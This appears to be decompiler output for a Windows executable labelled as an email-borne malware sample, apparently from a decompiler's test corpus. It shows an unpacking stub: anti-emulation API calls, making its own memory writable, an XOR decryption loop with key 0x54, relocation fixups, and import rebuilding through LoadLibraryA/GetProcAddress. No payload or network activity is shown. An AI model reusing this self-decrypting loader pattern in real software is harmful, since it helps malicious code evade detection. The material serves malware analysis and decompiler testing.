// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0662/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 edx, word32 esi, word32 edi)
{
fn00401000_entry:
l00401000:
	Eq_2 * ebx_15 = null
	Eq_2 * ebp_21 = (Eq_2 *) 0x00000028
	branch AddUsersToEncryptedFile(0x00403020, 0x00000000) != 0x00000000 l00401025
l00401024:
	return
l00401025:
	fp->dwFFFFFFEC = 0xFFFFFFFF;
	fp->dwFFFFFFEC = 0xFFFFFFFF;
	word32 eax_32 = AreAllAccessesGranted(0x00403020, 0x00000000)
	branch eax_32 != 0x00000000 l00401039
l00401036:
	ebp_21 = eax_32 + 0x00000026;
l00401039:
	fp->dwFFFFFFEC = (fp - 0x00000010).u0;
	fp->dwFFFFFFEC = 0x00000040;
	VirtualProtect(0x00401000, 0x00003000, 0xFFFFFFFF, 0xFFFFFFFF)
	fp->dwFFFFFFEC = 0x000000E3;
	Eq_56 * eax_52 = null
l00401060:
	branch ebx_15 != ebp_21 l00401069
l00401067:
	ebx_15 = null;
l00401069:
	eax_52->b4015D8 = ebx_15->b404000 ^ eax_52->b4015D8 ^ 0x54;
	eax_52 = eax_52 + 1;
	ebx_15 = ebx_15 + 1;
	branch eax_52 <u (Eq_56 *) 0x00001440 l00401060
l0040108E:
	fp->dwFFFFFFEC = 0x000000E4;
	Eq_84 * ecx_270 = &globals->t4028D8
	up32 dwLoc0C_269 = 0x00000000
	branch false l0040110F
l004010BB:
l004010C0:
	Eq_102 eax_278 = ecx_270->dw0004 - 0x00000008 >>u 0x00000001
	Eq_110 * edx_281 = &ecx_270->t0008
	branch eax_278 <= 0x00000000 l004010FA
l004010CF:
	Eq_102 ebx_293 = eax_278
l004010D1:
	word32 eax_296 = (word32) edx_281->w0000
	branch (eax_296 & 0x0000F000) != 0x00003000 l004010F2
l004010E7:
	Eq_204 * eax_307 = (eax_296 & 0x00000FFF) + ecx_270->dw0000
	eax_307->dw401358 = eax_307->dw401358 + 0xF0401358;
l004010F2:
	edx_281 = edx_281 + 1;
	ebx_293 = ebx_293 - 0x00000001;
	branch ebx_293 != 0x00000000 l004010D1
l004010FA:
	word32 eax_285 = ecx_270->dw0004
	up32 edx_287 = dwLoc0C_269 + eax_285
	ecx_270 = ecx_270 + eax_285;
	dwLoc0C_269 = edx_287;
	branch edx_287 <u 0x000000E4 l004010C0
l0040110F:
	branch Mem80[0x004020D4:word32] == 0x00000000 l004011B0
	Eq_93 * ebx_103 = &globals->t4020C4
	Eq_93 * dwLoc0C_104 = &globals->t4020C4
	ebx_145 = ebx_103;
	branch Mem80[0x004020D4:word32] == 0x00000000 l004011B0
l00401126:
	Eq_93 * ebx_145
	branch LoadLibraryA(ebx_145->dw000C + 0x00401358) == 0x00000000 l0040119F
	Eq_138 eax_161 = LoadLibraryA(ebx_145->dw000C + 0x00401358)
	Eq_138 edx_163 = eax_161
	branch eax_161 == 0x00000000 l0040119F
l0040113F:
	branch ebx_145->dw0000 != 0x00000000 l00401148
	word32 ebp_190 = ebx_145->dw0000
	branch ebp_190 != 0x00000000 l00401148
l00401145:
	ebp_190 = ebx_145->dw0010;
l00401148:
	Eq_170 * ebp_195 = ebp_190 + 0x00401358
	Eq_173 eax_199 = ebp_195->t0000
	Eq_177 * edi_200 = dwLoc0C_104->dw0010 + 0x00401358
	branch eax_199 == 0x00000000 l0040119B
l0040115D:
	goto l00401164
l00401160:
	edx_163 = eax_161;
l00401164:
	word32 eax_238
	branch eax_199 >= 0x00000000 l0040117D
l00401168:
	eax_238 = GetProcAddress(edx_163, (word32) ebp_195->t0000);
	goto l0040118C
l0040117D:
	eax_238 = GetProcAddress(edx_163, eax_199.u0);
l0040118C:
	edi_200->dw0000 = eax_238;
	ebp_195 = ebp_195 + 1;
	eax_199 = ebp_195->t0000;
	edi_200 = edi_200 + 1;
	branch eax_199 != 0x00000000 l00401160
l0040119B:
	ebx_145 = dwLoc0C_104;
l0040119F:
	ebx_145 = ebx_145 + 1;
	dwLoc0C_104 = ebx_145;
	branch ebx_145->dw0010 != 0x00000000 l00401126
l004011B0:
	0x00401DB8()
	ExitProcess(0x00000000)
	int3()
	0x00401DB8()
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

